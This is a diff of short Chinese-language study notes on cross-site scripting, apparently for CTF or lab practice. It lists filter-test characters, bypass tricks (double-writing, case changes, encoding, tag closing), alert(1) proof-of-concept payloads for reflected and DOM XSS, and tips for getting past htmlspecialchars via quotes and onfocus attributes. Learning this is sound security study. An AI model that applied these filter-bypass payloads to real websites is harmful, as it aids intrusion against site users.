@@ -1,28 +1,23 @@
-# 被过滤
+# 测试过滤词
+
+
 
 ```
-script 
-data
-on
-data
-
+"<>'on/`() script img href src java
 ```
 
-
+等等...
 
 # 绕过技巧
 
 ```
 双写
 大小写
+编码方式
 看view：source   ，闭合标签
 ```
 
-
-
 # 反射型xss
-
-最基本的
 
 ```
 <script>alert(1)</script>
@@ -37,6 +32,16 @@ onfocus=javascript:alert(1)'
 
 
 
+# 存储型xss
+
+存储在文件里，其他用户访问该界面，会执行特定js代码
+
+
+
+# DOM型xss
+
+需要技巧来闭合标签 
+
 ```
 "> <a href=javascript:alert()> "<
 ```
@@ -48,4 +53,11 @@ onfocus=javascript:alert(1)'
 
 
 
-# 
+# htmlspecialchars
+
+```
+绕过尝试单双引号都试试
+如尖括号被过滤 考虑标签内属性onfocus等
+```
+
+#  
